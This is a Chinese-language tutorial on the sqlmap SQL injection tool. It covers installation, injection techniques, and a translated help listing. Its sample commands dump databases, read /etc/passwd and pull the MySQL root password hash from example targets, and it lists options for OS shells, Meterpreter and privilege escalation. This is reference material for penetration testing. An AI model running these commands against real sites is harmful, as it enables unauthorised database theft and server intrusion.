---
title: sqlmap 数据库渗透测试工具
date: 2020-11-18
author: LM
---

## 1.sqlmap

**sqlmap 是一个开源的数据库渗透测试工具，它自动化了 sql 检测，注入的过程。**

[ sqlmap官网下载 ](http://sqlmap.org/)

```bash
# 进入 sqlmap 源码文件夹，因为 sqlmap 用的是 python2 编写的，需要编译后使用
tar zxvf sqlmap.tar.gz
cd sqlmap
./sqlmap.py
# 创建 sqlmap 命令
ln -s /root/sqlmapproject-sqlmap-7eab1bc/sqlmap.py /usr/bin/sqlmap
sqlmap -h # 帮助命令
```

## 2.sqlmap 的语法

sqlmap 命令选项被归类为目标（Target）、请求（Request）、优化、注入、检测、技巧（Techniques）、指纹、枚举等。当给 sqlmap 一个 url 的时候，它会执行如下操作

1. 判断可注入的参数
2. 判断可以用那种 sql 注入技术来注入
3. 识别出哪种数据库
4. 根据用户选择，读取哪些数据

## 3.sqlmap 支持的数据库

MySQL， Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite 等

## 4.sqlmap 支持五种不同的注入模式测试

- 基于布尔的盲注，即可以根据返回页面判断条件真假的注入
- 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断
- 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中
- 联合查询注入，可以使用 union 的情况下的注入
- 堆查询注入，可以同时执行多条语句的执行时的注入

## 5.如何使用

```bash
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11"        # 检查注入点 
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" --dbs  # 列出数据库信息    
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx --tables            # 指定库名, 并列出所有表
sqlmap -u "http://ooxx.com.tw/star_photo.php?artist_id=11" -D xxxxx -T admin --columns  # 指定库名, 并表名列出所有字段
                                                                               
sqlmap -u "注入地址" -v 1 --dbs              # 列出数据库   
sqlmap -u "注入地址" -v 1 --current-db       # 列出当前数据库  
sqlmap -u "注入地址" -v 1 --users            # 列出数据库用户  
sqlmap -u "注入地址" -v 1 --current-user     # 列出当前用户  
sqlmap -u "注入地址" -v 1 --tables -D "数据库"                         # 列出数据库的表名  
sqlmap -u "注入地址" -v 1 --columns -T "表名" -D "数据库"               # 获取表的列名  
sqlmap -u "注入地址" -v 1 --dump -C "字段,字段" -T "表名" -D "数据库"    # 获取表中的数据   

# 指定参数注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "id" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -p "cat,id" 
# 指定方法和post的数据 
sqlmap -u "http://192.168.1.47/page.php" --method "POST" --data "id=1&cat=2" 
# 指定cookie,可以注入一些需要登录的地址 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --cookie "COOKIE_VALUE" 
# 指定关键词，也可以不指定。程序会根据返回结果的hash自动判断 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --string "STRING_ON_TRUE_PAGE" 
# 显示指定的文件内容，一般用于php 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --file-read /etc/passwd 
# 执行你自己的sql语句
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --sql-query="SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" 
# union注入 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" --union-check 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --union-use --banner 
# 保存注入过程到一个文件, 支持从文件恢复出注入过程 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 -b -o "sqlmap.log" 
sqlmap -u "http://192.168.1.47/page.php?id=1&cat=2" -v 1 --banner -o "sqlmap.log" --resume
```

## 6.一些参与参数的解析

- `*`：在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分。sqlmap 可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。比如：`'/admin/1/'`，sqlmap 无法自动识别注入点，对于这种网页，可以直接在参数后加上一个星号，手动标注注入位置，如`sqlmap -u "www.baidu.com/admin/1*"`
- `--data`：使用 post 方式提交时，需要用到 data 参数
- `-p`：当我们已经事先知道哪一个参数存在注入就可以直接使用 -p 来指定，从而减少运行时间
- `--level`：不同的 level 等级，当 level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当 level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，Referer 进行注入。
- `--technique`：这个参数可以指定 sqlmap 使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：B：Boolean-based blind SQL injection（布尔型注入）；E：Error-based SQL injection（报错型注入）；U：UNION query SQL injection（可联合查询注入）；S：Stacked queries SQL injection（可多语句查询注入）；T：Time-based blind SQL injection（基于时间延迟注入）

## 7.sqlmap帮助文档翻译

```bash
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.1.3#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

Usage: python sqlmap [options]

Options(选项):
  -h, --help            显示基本帮助信息
  -hh                   显示高级帮助信息
  --version             显示版本号
  -v VERBOSE            详细级别：0-6（默认为1）.设置输出信息的详细程度
                        0:只显示追踪栈 ,错误以及重要信息。1:还显示信息和警告。2:显示debug消息。3:显示注入payload。
                        4:显示HTTP请求。5:显示HTTP响应头。6:显示HTTP响应内容

  Target(目标):
    以下至少需要设置其中一个选项来提供给目标URL
    -d DIRECT           直接连接到数据库的连接字符串。
    -u URL, --url=URL   目标 URL (e.g. "http://www.site.com/vuln.php?id=1")
    -l LOGFILE          从Burp或WebScarab代理的日志中解析目标
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file           从远程站点地图文件(.xml)解析目标(s)
    -m BULKFILE         Scan multiple targets given in a textual file            扫描文本文件中给出的多个目标  
    -r REQUESTFILE      Load HTTP request from a file                            从文件加载HTTP请求  
    -g GOOGLEDORK       Process Google dork results as target URLs               处理Google dork的结果作为目标URL
    -c CONFIGFILE       Load options from a configuration INI file               从INI配置文件中加载选项。  

  Request(请求):
    这些选项可以用来指定如何连接到目标URL。
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)               强制使用给定的HTTP方法（e.g. PUT）  
    --data=DATA         Data string to be sent through POST                       通过POST发送的数据字符串  
    --param-del=PARA..  Character used for splitting parameter values             用于拆分参数值的字符  
    --cookie=COOKIE     HTTP Cookie header value                                  HTTP Cookie头的值  
    --cookie-del=COO..  Character used for splitting cookie values                用于分割Cookie值的字符  
    --load-cookies=L..  File containing cookies in Netscape/wget format           包含Netscape / wget格式的cookie的文件 
    --drop-set-cookie   Ignore Set-Cookie header from response                    从响应中忽略Set-Cookie头  
    --user-agent=AGENT  HTTP User-Agent header value                              指定 HTTP User - Agent头    
    --random-agent      Use randomly selected HTTP User-Agent header value        使用随机选定的HTTP User - Agent头
    --host=HOST         HTTP Host header value                                    HTTP主机头值 
    --referer=REFERER   HTTP Referer header value                                 指定 HTTP Referer头 
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")          额外header  
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")     额外header  
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)     HTTP认证类型(Basic, Digest, NTLM or PKI) 
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)           HTTP认证凭证(name:password)  
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file             HTTP认证 PEM认证/私钥文件  
    --ignore-401        Ignore HTTP Error 401 (Unauthorized)                      忽略HTTP错误401(未经授权)  
    --ignore-proxy      Ignore system default proxy settings                      忽略系统默认代理设置 
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL                  使用代理连接到目标网址  
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)          代理认证证书(name:password)   
    --proxy-file=PRO..  Load proxy list from a file                               从文件中加载代理列表  
    --tor               Use Tor anonymity network                                 使用Tor匿名网络  
    --tor-port=TORPORT  Set Tor proxy port other than default                     设置Tor代理端口而不是默认值  
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))     设置Tor代理类型  
    --check-tor         Check to see if Tor is used properly                      检查Tor是否正确使用
    --delay=DELAY       Delay in seconds between each HTTP request                每个HTTP请求之间的延迟（秒）
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)    秒超时连接前等待（默认30） 
    --retries=RETRIES   Retries when the connection timeouts (default 3)          连接超时时重试（默认值3）
    --randomize=RPARAM  Randomly change value for given parameter(s)              随机更改给定参数的值(s) 
    --safe-url=SAFEURL  URL address to visit frequently during testing            在测试期间频繁访问的URL地址 
    --safe-post=SAFE..  POST data to send to a safe URL                           POST数据发送到安全URL  
    --safe-req=SAFER..  Load safe HTTP request from a file                        从文件加载安全HTTP请求  
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL      在两次访问给定安全网址之间测试请求
    --skip-urlencode    Skip URL encoding of payload data                         跳过有效载荷数据的URL编码  
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token                    参数用于保存anti-CSRF令牌  
    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token           提取anti-CSRF URL地址访问令牌  
    --force-ssl         Force usage of SSL/HTTPS                                  强制使用SSL / HTTPS    
    --hpp               Use HTTP parameter pollution method                       使用HTTP参数pollution的方法 
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.    评估请求之前提供Python代码  
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization（优化）:
    这些选项可用于优化SqlMap的性能。

    -o                  打开所有优化开关
    --predict-output    预测常见的查询输出
    --keep-alive        使用持久的HTTP（S）连接
    --null-connection   从没有实际的HTTP响应体中检索页面长度
    --threads=THREADS   最大的HTTP（S）请求并发量（默认为1）

  Injection（注入）:
    这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。

    -p TESTPARAMETER    可测试的参数（S）
    --skip=SKIP         Skip testing for given parameter(s)    跳过对给定参数的测试  
    --skip-static       Skip testing parameters that not appear to be dynamic    跳过测试不显示为动态的参数  
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")    使用正则表达式排除参数进行测试（e.g. "ses"）
    --dbms=DBMS         强制后端的DBMS为此值
    --dbms-cred=DBMS..  DBMS认证凭证(user:password)   
    --os=OS             强制后端的DBMS操作系统为这个值
    --invalid-bignum    使用大数字使值无效  
    --invalid-logical   使用逻辑操作使值无效  
    --invalid-string    使用随机字符串使值无效  
    --no-cast           Turn off payload casting mechanism    关闭有效载荷铸造机制  
    --no-escape         Turn off string escaping mechanism    关闭字符串转义机制  
    --prefix=PREFIX     注入payload字符串前缀
    --suffix=SUFFIX     注入payload字符串后缀
    --tamper=TAMPER     使用给定的脚本（S）篡改注入数据

  Detection（检测）:
    这些选项可用于自定义检测阶段。即这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

    --level=LEVEL       执行测试的等级（1-5，默认为1）
    --risk=RISK         执行测试的风险（0-3，默认为1）
    --string=STRING     查询有效时，在页面匹配字符串。即当查询被评估为True时，字符串匹配
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     查询有效时，在页面匹配正则表达式
    --code=CODE         HTTP code to match when query is evaluated to True
    --text-only         仅基于在文本内容比较网页
    --titles            Compare pages based only on their titles    仅根据他们的标题进行比较

  Techniques（技巧）:
    这些选项可用于调整具体的SQL注入测试。

    --technique=TECH    SQL注入技术测试（默认BEUST）
    --time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection    定列范围用于测试UNION查询注入  
    --union-char=UCHAR  Character to use for bruteforcing number of columns       用于暴力猜解列数的字符  
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection    要在UNION查询SQL注入的FROM部分使用的表
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack              域名用于DNS漏出攻击 
    --second-order=S..  Resulting page URL searched for second-order response     生成页面的URL搜索为second-order响应  

  Fingerprint（指纹）:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint。 执行检查广泛的DBMS版本指纹

  Enumeration(枚举):
    这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner                      //检索数据库管理系统的标识
    --current-user      Retrieve DBMS current user                // 检索数据库管理系统当前用户
    --current-db        Retrieve DBMS current database            //检索数据库管理系统当前数据库
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA    //检测DBMS当前用户是否DBA
    --users             Enumerate DBMS users                      //枚举数据库管理系统所有的用户
    --passwords         Enumerate DBMS users password hashes      //枚举数据库管理系统用户密码哈希
    --privileges        Enumerate DBMS users privileges           //枚举数据库管理系统用户的权限
    --roles             Enumerate DBMS users roles                //枚举数据库管理系统用户的角色
    --dbs               Enumerate DBMS databases                  //枚举数据库管理系统所有数据库
    --tables            Enumerate DBMS database tables            //枚举的DBMS数据库中所有的表
    --columns           Enumerate DBMS database table columns     //枚举DBMS数据库表所有的列
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries          //转储数据库管理系统的数据库中的表项
    --dump-all          Dump all DBMS databases tables entries    //转储所有的DBMS数据库表中的条目
    --search            Search column(s), table(s) and/or database name(s)    //搜索列（S），表（S）和/或数据库名称（S）
    --comments          Retrieve DBMS comments
    -D DB               DBMS database to enumerate                               // 要进行枚举的指定数据库名
    -T TBL              DBMS database table(s) to enumerate                      // 要进行枚举的指定数据库表(如：-T tablename –columns)
    -C COL              DBMS database table column(s) to enumerate               //要进行枚举的数据库列
    -X EXCLUDECOL       DBMS database table column(s) to not enumerate
    -U USER             DBMS user to enumerate                                   //用来进行枚举的数据库用户
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables    //枚举表时排除系统数据库
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First query output entry to retrieve                //第一个查询输出进入检索
    --stop=LIMITSTOP    Last query output entry to retrieve                 //最后查询的输出进入检索
    --first=FIRSTCHAR   First query output word character to retrieve       //第一个查询输出字的字符检索
    --last=LASTCHAR     Last query output word character to retrieve        //最后查询的输出字字符检索
    --sql-query=QUERY   SQL statement to be executed                        //要执行的SQL语句
    --sql-shell         Prompt for an interactive SQL shell                 // 提示交互式SQL的shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force（野蛮、蛮力）:
    这些选项可以被用来运行蛮力检查。

    --common-tables     Check existence of common tables    // 检查存在共同表
    --common-columns    Check existence of common columns   // 检查存在共同列

  User-defined function injection（用户自定义函数注入）:
    这些选项可以用来创建用户自定义函数。

    --udf-inject        Inject custom user-defined functions  // 注入用户自定义函数
    --shared-lib=SHLIB  Local path of the shared library      // 共享库的本地路径

  File system access（访问文件系统）:
    这些选项可以被用来访问后端数据库管理系统的底层文件系统。

    --file-read=RFILE   Read a file from the back-end DBMS file system          // 从后端的数据库管理系统文件系统读取文件
    --file-write=WFILE  Write a local file on the back-end DBMS file system     // 编辑后端的数据库管理系统文件系统上的本地文件
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to             // 后端的数据库管理系统写入文件的绝对路径

  Operating system access（操作系统访问）:
    这些选项可以用于访问后端数据库管理系统的底层操作系统。

    --os-cmd=OSCMD      执行操作系统命令
    --os-shell          Prompt for an interactive operating system shell          // 交互式的操作系统的shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC               // 获取一个OOB shell，meterpreter或VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC     // 一键获取一个OOB shell，meterpreter或VNC
    --os-bof            Stored procedure buffer overflow exploitation             // 存储过程缓冲区溢出利用
    --priv-esc          Database process user privilege escalation                // 数据库进程用户权限提升
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed        // Metasploit Framework本地的安装路径
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory         // 远程临时文件目录的绝对路径

  Windows registry access（Windows注册表访问）:
    这些选项可以被用来访问后端数据库管理系统Windows注册表。

    --reg-read          读一个Windows注册表项值
    --reg-add           写一个Windows注册表项值数据
    --reg-del           删除Windows注册表键值
    --reg-key=REGKEY    Windows注册表键
    --reg-value=REGVAL  Windows注册表项的值
    --reg-data=REGDATA  Windows注册表键值数据
    --reg-type=REGTYPE  Windows注册表项值类型

  General（一般，通用，基本）:
    这些选项可以用来设置一些一般的工作参数。

    -s SESSIONFILE      Load session from a stored (.sqlite) file               保存和恢复检索会话文件的所有数据  
    -t TRAFFICFILE      Log all HTTP traffic into a textual file                记录所有HTTP流量到一个文本文件中  
    --batch             Never ask for user input, use the default behaviour     从不询问用户输入，使用所有默认配置。
    --binary-fields=..  Result fields having binary values (e.g. "digest")      具有二进制值的结果字段  
    --charset=CHARSET   Force character encoding used for data retrieval        强制用于数据检索的字符编码
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL          从目标网址开始抓取网站
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")   正则表达式排除网页抓取 
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")   分隔CSV输出中使用的字符
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)   转储数据的格式
    --eta               Display for each output the estimated time of arrival   显示每个输出的预计到达时间
    --flush-session     Flush session files for current target                  刷新当前目标的会话文件  
    --forms             Parse and test forms on target URL                      在目标网址上解析和测试表单
    --fresh-queries     Ignore query results stored in session file             忽略在会话文件中存储的查询结果
    --hex               Use DBMS hex function(s) for data retrieval             使用DBMS hex函数进行数据检索  
    --output-dir=OUT..  Custom output directory path                            自定义输出目录路径  
    --parse-errors      Parse and display DBMS error messages from responses    解析和显示响应中的DBMS错误消息
    --save=SAVECONFIG   Save options to a configuration INI file                保存选项到INI配置文件  
    --scope=SCOPE       Regexp to filter targets from provided proxy log        使用正则表达式从提供的代理日志中过滤目标
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)       根据有效负载和/或标题(e.g. ROW)选择测试
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)   根据有效负载和/或标题跳过测试（e.g. BENCHMARK）  
    --update            Update sqlmap                                           更新SqlMap  

  Miscellaneous（杂项）:
    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")          使用简短的助记符 
    --alert=ALERT       Run host OS command(s) when SQL injection is found       在找到SQL注入时运行主机操作系统命令 
    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")            设置问题答案  
    --beep              发现SQL注入时提醒
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables    SqlMap具体的UDF和表清理DBMS 
    --dependencies      Check for missing (non-core) sqlmap dependencies         检查是否缺少（非内核）sqlmap依赖关系
    --disable-coloring  Disable console output coloring                          禁用控制台输出颜色 
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number       使用Google dork结果指定页码  
    --identify-waf      Make a thorough testing for a WAF/IPS/IDS protection     对WAF / IPS / IDS保护进行全面测试  
    --mobile            Imitate smartphone through HTTP User-Agent header 
    --offline           Work in offline mode (only use session data)             在离线模式下工作（仅使用会话数据）  
    --purge-output      Safely remove all content from output directory          安全地从输出目录中删除所有内容  
    --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection       跳过启发式检测WAF / IPS / IDS保护 
    --smart             Conduct thorough tests only if positive heuristic(s)     只有在正启发式时才进行彻底测试  
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
    --wizard            Simple wizard interface for beginner users               给初级用户的简单向导界面
```
